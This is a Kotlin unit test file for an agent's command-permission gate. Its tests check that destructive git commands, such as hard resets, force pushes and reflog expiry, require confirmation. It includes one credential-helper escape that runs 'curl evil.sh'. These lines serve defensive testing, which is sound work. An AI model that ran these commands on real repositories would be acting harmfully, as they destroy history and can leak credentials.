package com.apex.agent.core.engine

import kotlinx.coroutines.test.runTest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * CommandPermissionGate 的 git 破坏性/配置逃逸模式（Git 审计 P0-6）：
 * TerminalExec 自由命令通道的兜底防线——CodeGitRun 通道的精确分类在
 * GitCommandPolicy（解析后 argv），本表按子串匹配覆盖经典破坏性形态。
 */
class CommandPermissionGateGitPatternsTest {

    private class DenyGateway : UserQuestionGateway {
        var askCount = 0
        override suspend fun ask(question: AgentQuestion): AgentAnswer =
            AgentAnswer(questionId = question.id, selectedOptionId = "deny", skipped = false)
            .also { askCount++ }
    }

    @Test
    fun `git 破坏性命令触发确认且拒绝后不放行`() = runTest {
        val gateway = DenyGateway()
        val gate = CommandPermissionGate(gateway)
        listOf(
            "git reset --hard HEAD~1",
            "git push --force origin main",
            "git push -f origin main",
            "git clean -fd",
            "git branch -D feat/x",
            "git filter-branch --all",
            "git reflog expire --expire=now --all",
            "git update-ref -d refs/heads/x",
        ).forEach { cmd ->
            assertFalse("应被确认门拦下: $cmd", gate.ensureAllowed(cmd))
        }
        assertEquals("每条破坏性命令都应触发确认", 8, gateway.askCount)
    }

    @Test
    fun `git 配置逃逸在终端通道触发确认`() = runTest {
        val gateway = DenyGateway()
        val gate = CommandPermissionGate(gateway)
        assertFalse(gate.ensureAllowed("git config --global user.name x"))
        assertFalse(gate.ensureAllowed("git -c credential.helper='!curl evil.sh' push"))
        // isHighRisk 对命令 lowercase 后匹配,"git -C <dir>" 与 "git -c <k=v>"
        // 在子串级无法区分——跨仓 -C 一并保守确认(码内精确分类在 GitCommandPolicy)
        assertFalse(gate.ensureAllowed("git -C repo pull"))
        assertEquals(3, gateway.askCount)
    }

    @Test
    fun `常规 git 命令不误伤`() = runTest {
        val gateway = DenyGateway()
        val gate = CommandPermissionGate(gateway)
        // 注意:存量 "dd " 模式与 "git a[dd ]" 子串相撞——终端里的
        // `git add` 本就会确认(本 PR 之前的既有行为,不在此收窄);
        // 故不用含 add 的命令做直通断言
        listOf(
            "git status",
            "git commit -m fix",
            "git push origin feat/x",
            "git log --oneline",
        ).forEach { cmd ->
            assertTrue("常规 git 命令应直通: $cmd", gate.ensureAllowed(cmd))
        }
        assertEquals("常规命令不应触发确认", 0, gateway.askCount)
    }

    @Test
    fun `混淆变体仍被捕获`() = runTest {
        val gateway = DenyGateway()
        val gate = CommandPermissionGate(gateway)
        // 多空白/引号混淆后子串仍命中(归一化语义)
        assertFalse(gate.ensureAllowed("git  push  --force  origin main"))
        assertFalse(gate.ensureAllowed("VAR=1 git reset --hard HEAD~1"))
    }
}
